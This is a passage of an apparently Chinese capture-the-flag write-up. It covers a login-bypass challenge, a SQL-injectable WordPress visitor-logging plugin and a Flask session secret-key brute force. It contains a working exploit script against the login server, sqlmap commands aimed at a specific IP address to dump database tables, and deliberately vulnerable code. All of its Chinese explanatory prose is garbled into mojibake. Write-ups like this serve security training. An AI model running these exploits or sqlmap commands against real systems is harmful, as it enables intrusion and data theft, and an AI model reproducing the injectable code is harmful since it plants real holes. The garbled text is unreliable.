VtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>                        <span class="token punctuation">&#125;</span>                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"Invalid username or password"</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    server <span class="token operator">=</span> http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>HTTPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyHandler<span class="token punctuation">)</span>    server<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><pre class="language-none"><code class="language-none">assert users[&quot;admin&quot;] &#x3D;&#x3D; &quot;admin&quot;users‰∏≠Â≠òÂú®Áî®Êà∑Âêç‚Äúadmin‚ÄùÂØÜÁ†Å‰πü‰∏∫‚Äúadmin‚ÄùÔºåË°®Èù¢‰∏äÁúãÈúÄË¶Å‰º†ÂÖ•ÁöÑÂèÇÊï∞‰πü‰∏∫admin&#x2F;admin„ÄÇ</code></pre><p><a href="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67"><img src="https://camo.githubusercontent.com/0a648064995f3f6282f0a6c04c149962353990ed8114498c12c0c2bef34b498f/68747470733a2f2f67697465652e636f6d2f776f646939386b2f636e626c6f6773696d616765732f7261772f6d61737465722f696d672f696d6167652d32303233303930373231303232323831372e706e67" alt="image-20230907210222817" loading="lazy"></a></p><p>ÁªßÁª≠ÂàÜÊûêÊ∫êÁ†ÅÂèØ‰ª•ÂèëÁé∞eval()ËØ≠Âè•Â∞Übase64.b64encodeË¶ÜÂÜô‰∏∫base64.b64decode</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token comment">#ÂΩì‰º†ÂÖ•ÁöÑÂèÇÊï∞items‰∏∫2‰∏™Êó∂ËØ•ÂáΩÊï∞Á≠â‰ª∑‰∫éÊ±Ç‰∏§‰∏™ÂèÇÊï∞ÁöÑÂºÇÊàñÂÄºÂπ∂ËøîÂõûÔºåÊâÄ‰ª•ÂΩì‰∏§‰∏™ÂèÇÊï∞Áõ∏Á≠âÊó∂‰∏çÁÆ°ËØ•ÂèÇÊï∞‰∏∫‰ΩïÂÄºÔºåËøîÂõûÂÄºÈÉΩ‰∏∫0</span><span class="token comment">#ËÄå‰º†ÂÖ•ÂèÇÊï∞Êúâ‰∏§‰∏™ËøáÊª§Ôºåusername‰∏çËÉΩÁ≠â‰∫é‚Äúadmin‚ÄùÔºå‰∏îusername‰∏çËÉΩÁ≠â‰∫épasswordÔºåËÄåÊãøÂà∞flagÈúÄË¶ÅhashedÂÄº‰∏∫0ÔºåÊÄé‰πàÊâçËÉΩÂÅöÂà∞Âë¢Ôºü</span></code></pre><p><strong>ËÄå‰º†ÂÖ•ÂèÇÊï∞Êúâ‰∏§‰∏™ËøáÊª§Ôºåusername‰∏çËÉΩÁ≠â‰∫é‚Äúadmin‚ÄùÔºå‰∏îusername‰∏çËÉΩÁ≠â‰∫épasswordÔºåËÄåÊãøÂà∞flagÈúÄË¶ÅhashedÂÄº‰∏∫0ÔºåÊÄé‰πàÊâçËÉΩÂÅöÂà∞Âë¢Ôºü</strong></p><p>Êé•‰∏ãÊù•ÁºñÂÜôËÑöÊú¨Âç≥ÂèØÊääÊûÑÈÄ†ÁöÑjsonÊï∞ÊçÆbase64ÁºñÁ†Å‰∫îÊ¨°</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> base64url <span class="token operator">=</span> <span class="token string">"http://localhost:5946/login"</span>username <span class="token operator">=</span> <span class="token string">"\"1\""</span>password <span class="token operator">=</span> <span class="token string">"1"</span>jsondata <span class="token operator">=</span> <span class="token string">"&#123;\"username\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>username<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">",\"password\":"</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>password<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    jsondata <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>jsondata<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token string">"&#123;\"params\":\""</span><span class="token operator">+</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>jsondata<span class="token punctuation">&#125;</span></span><span class="token string">\""</span></span><span class="token operator">+</span><span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>req <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>req <span class="token operator">=</span> <span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span></code></pre><h4 id="Âá∫ÂéªÊóÖÊ∏∏ÁöÑÂøÉÊµ∑"><a href="#Âá∫ÂéªÊóÖÊ∏∏ÁöÑÂøÉÊµ∑" class="headerlink" title="Âá∫ÂéªÊóÖÊ∏∏ÁöÑÂøÉÊµ∑"></a>Âá∫ÂéªÊóÖÊ∏∏ÁöÑÂøÉÊµ∑</h4><p>Êü•ÁúãÊ∫êÁ†ÅÈ°µÈù¢ÂèØÂèëÁé∞‰∏Ä‰∏™phpÊñá‰ª∂ÈìæÊé•</p><p><img src="%E5%BF%83%E6%B5%B71.png" loading="lazy"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*Plugin Name: Visitor auto recorderDescription: Automatically record visitor's identification, still in development, do not use in industry environment!Author: KoKoMi  Still in development! :)*/</span><span class="token comment">// ‰∏çËÆ∏ÂÅ∑ÁúãÔºÅËøô‰∫õ‰ª£Á†ÅÊàëËøòÂú®Ë∞ÉËØïÂë¢ÔºÅ</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Âä†ËΩΩÊï∞ÊçÆÂ∫ìÈÖçÁΩÆÔºåÊöÇÊó∂Áî®Á°¨ÁºñÁ†ÅÁªùÂØπË∑ØÂæÑ</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/var/www/html/wordpress/'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'wp-config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_user</span> <span class="token operator">=</span> <span class="token constant">DB_USER</span><span class="token punctuation">;</span> <span class="token comment">// Êï∞ÊçÆÂ∫ìÁî®Êà∑Âêç</span><span class="token variable">$db_password</span> <span class="token operator">=</span> <span class="token constant">DB_PASSWORD</span><span class="token punctuation">;</span> <span class="token comment">// Êï∞ÊçÆÂ∫ìÂØÜÁ†Å</span><span class="token variable">$db_name</span> <span class="token operator">=</span> <span class="token constant">DB_NAME</span><span class="token punctuation">;</span> <span class="token comment">// Êï∞ÊçÆÂ∫ìÂêçÁß∞</span><span class="token variable">$db_host</span> <span class="token operator">=</span> <span class="token constant">DB_HOST</span><span class="token punctuation">;</span> <span class="token comment">// Êï∞ÊçÆÂ∫ì‰∏ªÊú∫</span><span class="token comment">// ÊàëËÆ∞ÂæóÂèØ‰ª•Áî®wpÊèê‰æõÁöÑglobal $wpdbÊù•Êìç‰ΩúÊï∞ÊçÆÂ∫ìÔºåÁ≠âÊóÖÊ∏∏ÂõûÊù•ÂÜçÁ†îÁ©∂‰∏Ä‰∏ã</span><span class="token comment">// Ëøô‰∫õÊòØ‰∏¥Êó∂ÁöÑ‰ª£Á†Å</span><span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$user_agent</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user_agent'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">stripslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'time'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$db_host</span><span class="token punctuation">,</span> <span class="token variable">$db_user</span><span class="token punctuation">,</span> <span class="token variable">$db_password</span><span class="token punctuation">,</span> <span class="token variable">$db_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Ê£ÄÊü•ËøûÊé•ÊòØÂê¶ÊàêÂäü</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Êï∞ÊçÆÂ∫ìËøûÊé•Â§±Ë¥•: '</span> <span class="token operator">.</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_error</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO visitor_records (ip, user_agent, time) VALUES ('<span class="token interpolation"><span class="token variable">$ip</span></span>', '<span class="token interpolation"><span class="token variable">$user_agent</span></span>', <span class="token interpolation"><span class="token variable">$time</span></span>)"</span><span class="token punctuation">;</span><span class="token comment">// ÊâßË°åÊèíÂÖ•</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Ê£ÄÊü•ÊèíÂÖ•ÊòØÂê¶ÊàêÂäü</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Êï∞ÊçÆÊèíÂÖ•ÊàêÂäü'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Êï∞ÊçÆÊèíÂÖ•Â§±Ë¥•: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// ÂÖ≥Èó≠Êï∞ÊçÆÂ∫ìËøûÊé•</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//gptÁúüÂ•ΩÁî®</span></span></code></pre><p><img src="%E5%BF%83%E6%B5%B72.png" loading="lazy"></p><p>Ê†πÊçÆÊµãËØïÂèëÁé∞timeÂ≠òÂú®Êä•ÈîôÊ≥®ÂÖ•</p><p><img src="%E5%BF%83%E6%B5%B73.png" loading="lazy"></p><p>sqlmap‰∏ÄÊääÊ¢≠</p><pre class="language-sql" data-language="sql"><code class="language-sql">python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  --dbs  --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress --tables --batch</span>python3 sqlmap<span class="token punctuation">.</span>py  <span class="token operator">-</span>u <span class="token string">"http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php"</span>  <span class="token comment">--data "time=1"  -D wordpress  -T secret_of_kokomi --columns --batch</span></code></pre><h4 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h4><p>È¶ñÂÖàÁàÜÁ†¥secret key</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> itertools<span class="token keyword">import</span> zlib<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> SecureCookieSessionInterface<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token comment">#https://github.com/noraj/flask-session-cookie-manager</span><span class="token keyword">class</span> <span class="token class-name">MockApp</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> secret_key<span class="token punctuation">)</span><span class="token punctuation">:</span>self<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> secret_key<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>secret_key<span class="token punctuation">,</span> session_cookie_structure<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">try</span><span class="token punctuation">:</span>app <span class="token operator">=</span> MockApp<span class="token punctuation">(</span>secret_key<span class="token punctuation">)</span>session_cookie_structure <span class="token operator">=</span> session_cookie_structuresi <span class="token operator">=</span> SecureCookieSessionInterface<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> si<span class="token punctuation">.</span>get_signing_serializer<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token keyword">return</span> s<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>session_cookie_structure<span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token string">"[Encoding error] 